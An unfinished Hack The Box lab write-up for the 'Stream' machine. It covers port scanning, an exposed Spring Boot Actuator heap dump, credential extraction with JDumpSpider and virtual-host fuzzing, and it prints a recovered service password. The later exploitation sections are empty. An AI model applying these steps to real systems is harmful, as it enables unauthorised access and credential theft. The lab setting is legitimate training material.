---
tags:
  - HTB
  - MACHINE
link: https://app.hackthebox.com/machines/Stream
difficulty: Medium
os: Linux
pov: red
description:
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a2cc2e41-9160-4e35-9d3f-8eb1e98cdf77-1789978330.png
solved:
solve date:
machine no.: 3
release date: 2026-10-10
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Stream Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a2cc2e41-9160-4e35-9d3f-8eb1e98cdf77-1789978330.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: <a href="https://app.hackthebox.com/users/1809572">nedmoeca</a></p>
    <p style="margin: 0;">Created by: <a href="https://app.hackthebox.com/users/260996">7u9y</a></p>
    <p style="margin: 0;">Difficulty: Easy</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Debrief


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Store the target address in a shell variable

**Command:**

```bash
IP=TARGET_IP
echo $IP
```

To clear the variable:

```bash
unset IP
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.3 Verify Target is Reachable

Verify that the target machine is up and reachable by performing an ICMP ping test.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

- `-c 4` → sends 4 packets only (clean output, fast)

**Result:**

```shell
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=242 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=229 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=578 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=295 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss
rtt min/avg/max/mdev = 229.009/335.850/577.967/141.961 ms
```

A successful response confirms that the machine is active and accessible on the HTB network, allowing us to proceed with the enumeration phase.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.4 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 1.4.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:** `nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo`

**Breakdown:**

| Component         | Purpose             | Simple Explanation                                                                                                                                                                                                                                 |
| ----------------- | ------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap`            | Port scanner        | Sends packets to each port and classifies the response as open, closed, or filtered.                                                                                                                                                               |
| `-p-`             | Port range          | Shorthand for ports 1–65535. Without it nmap checks only its built-in list of 1000 common ports.                                                                                                                                                   |
| `--min-rate 5000` | Timing floor        | Forces at least 5000 packets per second instead of letting nmap's adaptive timing throttle down. This is what makes a full-range scan finish in seconds rather than minutes. Note the **double** dash.                                             |
| `-Pn`             | Skip host discovery | Treats the host as up without pinging first. HTB machines commonly drop ICMP; without this, nmap may conclude the host is down and scan nothing.                                                                                                   |
| `\| grapo`        | Custom filter       | Local zsh function: `tee /dev/tty \| grep -oP '^\d+(?=/tcp\s+open)' \| paste -sd, \| sed 's/^/\n/'`. Prints the full nmap output to the terminal while extracting open port numbers into a comma-separated list ready to paste into the next scan. |

**Result:**

```shell
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
8081/tcp  open  blackice-icecap
40899/tcp open  unknown
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.2 Fingerprint the open services

**Command:** `nmap -A -p p1,p2,p3,p4 TARGET_IP`

**Breakdown:**

| Component             | Purpose         | Simple Explanation                                                                                                                                                     |
| --------------------- | --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `nmap`                | Port scanner    | Reconnects to the given ports, this time to interrogate each service rather than just confirm it’s open.                                                               |
| `-A`                  | Aggressive scan | Bundles four things at once: service/version detection, default NSE scripts, OS fingerprinting, and traceroute. Turns “port 8081 is open” into “Uvicorn serving JSON.” |
| `-p 22,80,8081,40899` | Port list       | Restricts the scan to the ports the full sweep already found open, so the slow `-A` probes run against four ports instead of all 65535.                                |


**Result:**

```shell
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-17 09:27 -0400
Nmap scan report for TARGET_IP
Host is up (0.28s latency).

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp    open  http       nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://api.htb-airport.htb/
8081/tcp  open  http       Uvicorn
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: uvicorn
40899/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   230.30 ms 10.10.14.1
2   230.05 ms TARGET_IP

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.96 seconds
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.3 Scan Results Analysis

| Port      | Service    | Version                           | Analysis                                                                                                                                                                                                       | Simple Explanation                                                                                                                                                           |
| --------- | ---------- | --------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 22/tcp    | SSH        | OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 | Current, fully patched OpenSSH. No pre-auth attack surface here; it only becomes useful once credentials turn up elsewhere in the chain. Park it.                                                              | The remote-login door. Solid lock, so there is no point attacking it directly. We come back once we have found a username and password.                                      |
| 80/tcp    | HTTP       | nginx 1.24.0 (Ubuntu)             | Does not serve on the raw IP; responds with a redirect toward `api.htb-airport.htb`. Confirms name-based virtual hosting, so the real site only appears when the correct Host header is sent. First real lead. | The web server refuses to show its site unless you knock using the right domain name instead of the bare IP address. That name is our way in.                                |
| 8081/tcp  | HTTP       | Uvicorn                           | Python ASGI server returning `application/json` with no HTML title. A machine-facing API rather than a human website; worth reading directly to learn what it ingests and how.                                 | A second web service that talks in raw data, not web pages. It is built for programs to call, which usually means it will tell us exactly what it expects if we just ask it. |
| 40899/tcp | tcpwrapped | Unknown                           | Handshake completes then the service drops it, so nmap cannot fingerprint it. Port number is randomized per spawn. No actionable surface; set aside.                                                           | A door that opens a crack then slams shut before saying anything. Nothing to work with, and the number changes each time the box restarts, so ignore it.                     |
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Enumeration

### 2.1 Web Service Enumeration

Two HTTP surfaces turned up in recon: the Uvicorn API on 8081 and the nginx gateway on 80. Read each directly to learn what it is and how it behaves before choosing an attack.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.1 Read the ingest service's self-description

The fingerprint scan flagged 8081 as a Uvicorn JSON API but not what it does. An API that documents itself usually states exactly what it expects, so query its root before guessing.

**Command:** `curl -s http://api.htb-airport.htb:8081/ | jq .`

**Breakdown:**

| Component | Purpose | Simple Explanation |
| --------- | ------- | ------------------ |
| `curl` | HTTP client | Fetches a URL from the command line and prints the response body. |
| `-s` | Silent mode | Suppresses curl's progress meter so only the response reaches the pipe. |
| `http://api.htb-airport.htb:8081/` | Target URL | The root of the Uvicorn API, addressed by vhost name on its non-standard port. |
| `\| jq .` | Pretty-print JSON | Pipes the raw JSON into `jq`, which indents and colorizes it so the structure is readable. |

**Result:**

```shell
{
  "service": "AIDX flight-leg ingest",
  "what": "Accepts AIDX XML for processing",
  "how": {
    "method": "POST",
    "path": "/feeds/aidx",
    "content_type": "application/xml",
    "max_bytes": 262144
  },
  "required_elements": [
    "IATA_AIDX_FlightLegNotifRQ",
    "Originator",
    "FlightLeg",
    "LegIdentifier"
  ],
  "note": "Ingest does not parse. Full validation happens downstream.",
  "health": "GET /health"
}
```

Key finding: a POST endpoint at `/feeds/aidx` that accepts up to 256 KB of `application/xml`, plus the element skeleton it requires. The `note` is decisive: this service does not parse the XML, it forwards it to a downstream consumer that does. Any XML-layer attack must target that unseen parser, delivered through this endpoint as transport.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.1.2 Identify the gateway stack on port 80

The scan showed nginx redirecting to this vhost but not what sits behind it. Reading the root reveals the application and, from its style, the framework, which decides the next probe.

**Command:** `curl -s -i http://api.htb-airport.htb/`

**Breakdown:**

| Component | Purpose | Simple Explanation |
| --------- | ------- | ------------------ |
| `curl` | HTTP client | Fetches the gateway root now that the vhost name resolves. |
| `-s` | Silent mode | Drops the progress meter. |
| `-i` | Include headers | Prints response headers above the body, so the server banner and content type show alongside the JSON. |
| `http://api.htb-airport.htb/` | Target URL | The nginx gateway, addressed by name on port 80. |

**Result:**

```shell
HTTP/1.1 200 
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 17 Oct 2026 14:14:34 GMT
Content-Type: application/json
Content-Length: 362
Connection: keep-alive

{"service":"terminal-edge-gateway","status":"operational","version":"1.0.0","node":"tg-edge-01","region":"eu-central-1","uptime":"0d 2h 17m 28s","upstreams":{"flight-data-service":"UP","boarding-control":"UP","gate-assignment":"UP","passenger-manifest":"UP"},"message":"All terminal gateway systems are operational.","timestamp":"2026-10-17T14:14:34.047172524Z"}
```

Key finding: a `terminal-edge-gateway` whose JSON shape, capitalized `UP` states, and version/node/region layout are characteristic of Spring Boot. That framework ships Actuator management endpoints which, left unauthenticated, expose diagnostics including a full heap dump.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.2 Spring Boot Actuator Heap Dump

The gateway is Spring Boot, so test whether its Actuator management endpoints were left exposed. One of them, the heap dump, serializes the whole JVM memory to disk, where connection-pool credentials sit in cleartext.

#### 2.2.1 Enumerate the Actuator endpoint index

Request the Actuator root. If management endpoints are unauthenticated, the index lists every one it will serve, which tells you what is reachable without a login.

**Command:** `curl -s http://api.htb-airport.htb/actuator | jq .`

**Breakdown:**

| Component | Purpose | Simple Explanation |
| --------- | ------- | ------------------ |
| `curl -s` | HTTP client, silent | Fetches the Actuator index quietly. |
| `/actuator` | Management root | Spring Boot's management index, which enumerates the exposed management endpoints as links. |
| `\| jq .` | Pretty-print JSON | Renders the `_links` map so each available endpoint is readable. |

**Result:**

```shell
{
  "_links": {
    "self": {
      "href": "http://api.htb-airport.htb/actuator",
      "templated": false
    },
    "heapdump": {
      "href": "http://api.htb-airport.htb/actuator/heapdump",
      "templated": false
    }
  }
}
```

Key finding: the index is served with no authentication and exposes `heapdump`. That single endpoint is enough, so there is no need to probe further management routes.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.2.2 Download the heap dump

Pull the heap dump to disk. It is a binary HPROF snapshot of live JVM memory, which is where the gateway's database credentials are held as objects.

**Command:** `curl -s http://api.htb-airport.htb/actuator/heapdump -o stream.hprof; ls -lh stream.hprof; file stream.hprof`

**Breakdown:**

| Component | Purpose | Simple Explanation |
| --------- | ------- | ------------------ |
| `curl -s .../heapdump` | Fetch the dump | Downloads the heap snapshot from the exposed endpoint. |
| `-o stream.hprof` | Save to file | Writes the binary body to a local file instead of the terminal. |
| `ls -lh stream.hprof` | Confirm size | Shows the file exists and how large it is (tens of MB is normal). |
| `file stream.hprof` | Confirm type | Verifies it is a genuine Java HPROF dump, not an error page saved by mistake. |

**Result:**

```shell
-rw-rw-r-- 1 nedmoeca nedmoeca 45M Oct 17 11:09 stream.hprof
stream.hprof: Java HPROF dump, created Sat Oct 17 15:09:10 2026
```

Key finding: a valid 45 MB HPROF dump of the running gateway. Everything the application holds in memory, credentials included, is now available offline for mining.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.3 Recover credentials from the heap dump

The dump holds the gateway's live objects. The goal is the datasource credentials. The first instinct, grepping for keywords, falls short and is worth showing, because it teaches why a heap needs an object-graph tool rather than text search.
<div align="center">
<br>
<br>
</div>

#### 2.3.1 First pass with strings (why keyword grep misses the secret)

Run a text sweep for the obvious markers. This is the natural first move and it does surface useful context, so document what it gives and what it does not.

**Command:** `strings stream.hprof | grep -iE 'jdbc:|password|username|hikari' | sort -u | head -40`

**Breakdown:**

| Component              | Purpose      | Simple Explanation                                              |          |                |                                                                                                           |
| ---------------------- | ------------ | --------------------------------------------------------------- | -------- | -------------- | --------------------------------------------------------------------------------------------------------- |
| `strings stream.hprof` | Extract text | Pulls every printable run of characters out of the binary dump. |          |                |                                                                                                           |
| `grep -iE 'jdbc:       | password     | username                                                        | hikari'` | Filter markers | Case-insensitively keeps lines mentioning a JDBC URL, the words password or username, or the Hikari pool. |
| `sort -u`              | Dedupe       | Collapses identical lines so the list is readable.              |          |                |                                                                                                           |
| `head -40`             | Trim         | Shows only the first 40 lines.                                  |          |                |                                                                                                           |

**Result:**

```shell
8jdbc:h2:mem:terminaldb;MODE=PostgreSQL;DB_CLOSE_DELAY=-1
8getPasswordBytes
8keystorePassword
8truststorePassword
8validateUserPasswordHash
$com/zaxxer/hikari/HikariConfigMXBean
$Lcom/zaxxer/hikari/HikariDataSource;
28000=Wrong user name or password
```

This recovers the JDBC URL (an H2 in-memory database named `terminaldb`, running in PostgreSQL-compatibility mode) but no username or password. The reason matters: in a heap dump the real credential values are standalone `String` objects with no `password=` label beside them, so a keyword grep matches Hikari class names and field labels and walks straight past the secret. To read a value you cannot name in advance, you must walk the object graph instead of searching text.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.3.2 Walk the object graph with JDumpSpider

JDumpSpider parses an HPROF dump and reconstructs known credential-bearing objects (Hikari pools, Spring datasource properties, and similar), printing their fields directly. This reads the `username` and `password` the text search could not.

**Command:**

```bash
wget -q https://github.com/whwlsfb/JDumpSpider/releases/latest/download/JDumpSpider-1.1-SNAPSHOT-full.jar -O JDumpSpider.jar
java -jar JDumpSpider.jar stream.hprof
```

**Breakdown:**

| Component | Purpose | Simple Explanation |
| --------- | ------- | ------------------ |
| `wget -q .../JDumpSpider...jar -O JDumpSpider.jar` | Fetch the tool | Downloads the heap-dump analyzer as a runnable jar. |
| `java -jar JDumpSpider.jar stream.hprof` | Parse the dump | Runs the analyzer against the HPROF file and prints every object class it recognizes. |

**Result:**

```shell
===========================================
OriginTrackedMapPropertySource
-------------
server.address = 127.0.0.1
management.endpoint.heapdump.access = unrestricted
management.endpoints.access.default = none
spring.application.name = terminal-gateway
spring.jpa.hibernate.ddl-auto = create-drop

===========================================
UserPassSearcher
-------------
org.h2.engine.Database:
[databaseName = mem:terminaldb, databaseShortName = TERMINALDB, databaseURL = jdbc:h2:mem:terminaldb]

com.zaxxer.hikari.util.Credentials:
[password = Yl4aCgh4y2PnU, username = svc_events]

org.apache.catalina.startup.Tomcat:
[hostname = localhost]
```

Key finding: the datasource credential `svc_events : Yl4aCgh4y2PnU`. The property dump also confirms the root cause, `management.endpoint.heapdump.access = unrestricted` while all other endpoints default to `none`, and names the app `terminal-gateway`. Because the heap database is an embedded in-memory H2 that is not network-reachable, this credential is a candidate for reuse against another service on the box.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 2.4 Virtual Host Discovery

The port 80 redirect proved name-based virtual hosting, and the recovered credential has no network-reachable home yet. Resolve the base domain, then enumerate the other vhosts on this IP to find where the credential is meant to be used.
<div align="center">
<br>
<br>
</div>

#### 2.4.1 Point the base domain at the target

The fuzzer requests the raw IP with a forged `Host:` header, and any vhost found afterward must resolve for direct requests. Add the base domain to the local hosts file.

**Command:** `echo "TARGET_IP htb-airport.htb" | sudo tee -a /etc/hosts`

**Breakdown:**

| Component | Purpose | Simple Explanation |
| --------- | ------- | ------------------ |
| `echo "TARGET_IP htb-airport.htb"` | Build the entry | Prints the IP-to-name mapping line to add. |
| `sudo tee -a /etc/hosts` | Append as root | Writes the line onto the end of the system hosts file, which requires root. |

**Result:**

```shell
TARGET_IP htb-airport.htb
```

The resolver now sends `htb-airport.htb` to the target, so subdomains discovered next can be requested by name.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 2.4.2 Fuzz for virtual hosts

With the base domain resolving, brute-force the `Host:` header to reveal every virtual host served on this IP.

**Command:**

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt:FUZZ \
     -u http://TARGET_IP/ -H "Host: FUZZ.htb-airport.htb" -ac -t 50
```

**Breakdown:**

| Component | Purpose | Simple Explanation |
| --------- | ------- | ------------------ |
| `ffuf` | Web fuzzer | Sends many requests, substituting each wordlist entry into the marked spot. |
| `-w ...subdomains...:FUZZ` | Wordlist | Binds the subdomain list to the keyword `FUZZ`. |
| `-u http://TARGET_IP/` | Target | Hits the raw IP so only the Host header decides which vhost answers. |
| `-H "Host: FUZZ.htb-airport.htb"` | Fuzzed header | Swaps each candidate name into the Host header, one request at a time. |
| `-ac` | Auto-calibrate | Learns the default catch-all response and auto-filters it, so only genuinely different vhosts remain. |
| `-t 50` | Threads | Runs 50 concurrent requests for speed. |

**Result:**

```shell
api                     [Status: 200, Size: 362, Words: 9, Lines: 1, Duration: 371ms]
db                      [Status: 200, Size: 4, Words: 1, Lines: 2, Duration: 1084ms]
```

Key finding: a second virtual host, `db.htb-airport.htb`. Its 4-byte, 2-line body is far too small to be a web page and is characteristic of a service endpoint (a ClickHouse HTTP interface answers a bare GET with `Ok.`). This is the most likely home for the `svc_events` datasource credential.


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Exploitation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Post-Exploitation
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. PrivEsc
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## 7. Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

